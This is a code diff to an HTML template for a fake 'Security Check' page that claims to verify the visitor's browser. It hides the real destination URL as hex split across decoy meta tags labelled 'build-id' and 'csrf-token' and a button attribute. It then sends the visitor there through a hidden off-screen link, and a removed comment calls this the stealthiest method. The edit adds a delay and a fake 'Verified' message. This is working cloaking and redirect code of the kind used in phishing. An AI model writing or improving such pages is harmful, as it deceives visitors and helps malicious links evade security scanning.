@@ -18,7 +18,7 @@
             width: 100%;
             margin: 0;
             padding: 0;
-            background-color: #111; /* Matched Error Page */
+            background-color: #111;
             color: #eee;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
@@ -27,7 +27,7 @@
             user-select: none;
         }
         #{{ ids.container }} {
-            background: #1a1a1a; /* Matched Error Page */
+            background: #1a1a1a;
             border: 1px solid #333;
             padding: 40px;
             border-radius: 8px;
@@ -40,7 +40,7 @@
             font-size: 24px; 
             font-weight: 700; 
             margin-bottom: 15px; 
-            color: #ff4444; /* Matched Error Page Accent */
+            color: #ff4444; 
             letter-spacing: -0.5px;
         }
         p { 
@@ -50,7 +50,7 @@
             line-height: 1.5;
         }
         #{{ ids.button }} {
-            background: #ff4444; /* Matched Error Page Accent */
+            background: #ff4444;
             color: white;
             border: none;
             padding: 14px 28px;
@@ -71,68 +71,55 @@
         #{{ ids.button }}:active { 
             transform: scale(0.98); 
         }
-        .spinner {
-            border: 3px solid rgba(255,255,255,0.2);
-            border-radius: 50%;
-            border-top: 3px solid #fff;
-            width: 18px;
-            height: 18px;
-            animation: spin 0.8s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
     <div id="{{ ids.container }}">
         <h2>Security Check</h2>
         <p>System is verifying your browser integrity. Please confirm to proceed to the destination.</p>
-        <button id="{{ ids.button }}" data-verify="{{ p3 }}" onclick="process()">
+        <button id="{{ ids.button }}" data-verify="{{ p3 }}">
             Verify Connection
         </button>
     </div>
     <script nonce="{{ nonce }}">
-        var clicked = false;
-        function process() {
-            if(clicked) return;
-            clicked = true;
-            
+        document.addEventListener('DOMContentLoaded', function() {
             var btn = document.getElementById("{{ ids.button }}");
-            btn.innerHTML = '<div class="spinner"></div> Verifying...';
-            btn.style.opacity = "0.8";
-            
-            // IMMEDIATE EXECUTION (No setTimeout) to ensure Mobile compatibility
-            try {
-                var m1 = document.querySelector('meta[name="build-id"]').getAttribute('content');
-                var m2 = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
-                var m3 = btn.getAttribute('data-verify');
-                var hex = m1 + m2 + m3;
-                var url = '';
-                for (var i = 0; i < hex.length; i += 2) {
-                    url += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-                }
+            var clicked = false;
+
+            btn.addEventListener('click', function(e) {
+                if(clicked) return;
+                clicked = true;
                 
-                // 1. Try Anchor Click (Stealthiest)
-                var link = document.createElement('a');
-                link.href = url;
-                link.rel = "noreferrer";
-                link.style.position = 'absolute';
-                link.style.left = '-9999px';
-                link.style.top = '0';
-                document.body.appendChild(link);
-                link.click();
+                btn.innerHTML = 'Verified... Redirecting';
+                btn.style.opacity = "0.7";
+                btn.style.cursor = "default";
 
-                // 2. Fallback (Guaranteed Redirect)
-                // If the anchor click fails (rare), this forces the move.
-                window.location.replace(url);
-
-            } catch (e) {
-                // If something breaks, reload to try again
-                window.location.reload();
-            }
-        }
+                setTimeout(function() {
+                    try {
+                        var m1 = document.querySelector('meta[name="build-id"]').getAttribute('content');
+                        var m2 = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+                        var m3 = btn.getAttribute('data-verify');
+                        var hex = m1 + m2 + m3;
+                        var url = '';
+                        for (var i = 0; i < hex.length; i += 2) {
+                            url += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+                        }
+                        
+                        var link = document.createElement('a');
+                        link.href = url;
+                        link.rel = "noreferrer";
+                        link.style.position = 'absolute';
+                        link.style.left = '-9999px';
+                        link.style.top = '0';
+                        document.body.appendChild(link);
+                        link.click();
+                        
+                    } catch (e) {
+                        window.location.reload();
+                    }
+                }, 2500);
+            });
+        });
     </script>
 </body>
 </html>
